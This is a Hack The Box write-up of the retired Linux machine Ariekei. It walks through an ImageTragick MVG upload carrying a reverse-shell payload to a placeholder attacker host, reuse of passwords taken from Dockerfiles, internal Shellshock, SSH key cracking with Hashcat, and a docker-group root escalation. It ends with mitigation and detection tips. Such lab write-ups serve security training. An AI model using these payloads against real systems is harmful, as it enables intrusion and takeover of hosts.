---
machine: Ariekei
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, web, shellshock, imagemagick, docker, privesc]
---

# Ariekei — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Two vhosts hide a blog with WAF-blocked Shellshock and an image converter vulnerable to ImageTragick. Uploading an MVG gives root in a container; mounted Dockerfiles reveal reused passwords and allow jumping to another container without the WAF, exploiting Shellshock and reaching the host. `spanishdancer`'s SSH key cracks and the `docker` group gives root.

## Recon

```bash
nmap -Pn -sCV -p22,443 <IP>
```

- `443` presents a certificate with the SANs `calvin.ariekei.htb` and `beehive.ariekei.htb`.
- `wfuzz` with `Host: FUZZ.ariekei.htb` confirms both vhosts.
- `beehive` serves a blog and `calvin` an image converter.

## Enumeration

- `feroxbuster` finds `/blog/`, `/cgi-bin/stats` and `/upload`.
- `cgi-bin/stats` runs a Bash 4.2.37 CGI, vulnerable to Shellshock.
- The `beehive` WAF blocks the Shellshock payload with a 403.
- `calvin` has no such WAF on `/upload`.

## Foothold

ImageMagick processes the upload and is vulnerable to ImageTragick (CVE-2016-3714). An MVG file with a malicious URL runs the command during conversion.

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/a.jpg"|bash -i >& /dev/tcp/<ATTACKER>/443 0>&1;echo "x)'
pop graphic-context
```

The resulting shell is `root` inside a container named `calvin`.

## Lateral movement

`/common` is mounted from the host and contains the container Dockerfiles and build scripts. The `blog-test` Dockerfile holds the root password and the `bastion-live` password. Those credentials allow SSH into the `bastion` container, which can reach the CGI without the WAF.

```bash
cat /common/*/Dockerfile
ssh root@<CONTAINER_IP>
```

## Privilege escalation

From `bastion`, exploit Shellshock on the internal CGI to get `www-data` on `blog-test`; the same Dockerfile root password gives root there. The user flag is in `/home/spanishdancer`; their SSH key cracks with `ssh2john` and Hashcat, and `spanishdancer` is in the `docker` group.

```bash
ssh2john id_rsa > key.hash
hashcat -m 22921 key.hash rockyou.txt
docker run -v /:/mnt -it bash bash
```

Inside the container, `/mnt` is Ariekei's filesystem; read `/mnt/root/root.txt` or add a rule to `/mnt/etc/sudoers`.

## Evidence

- `beehive` and `calvin` vhosts with different WAF behavior.
- Shellshock blocked on the public vhost.
- ImageTragick MVG and root in the container.
- Dockerfiles with reused passwords.
- Internal Shellshock, cracked SSH key and `docker` group.

## Lessons learned

- A WAF on one vhost does not protect the same service on the internal network.
- Dockerfiles and build scripts often contain secrets.
- ImageTragick still appears in old image converters.
- The `docker` group is equivalent to host root.

## Mitigation and detection

- Update Bash and ImageMagick; block MVG/SVG uploads.
- Do not store passwords in Dockerfiles or mount build code in production.
- Remove users from the `docker` group and apply `no-new-privileges`.
- Monitor requests containing `() { :;};` and `bash` child processes of the CGI.

## References

- [0xdf — Ariekei](https://0xdf.gitlab.io/2022/04/20/htb-ariekei.html)
- [IppSec — Ariekei](https://www.youtube.com/watch?v=Pc4tzsn-ats)
- [Hack The Box — Ariekei](https://app.hackthebox.com/machines/ariekei)
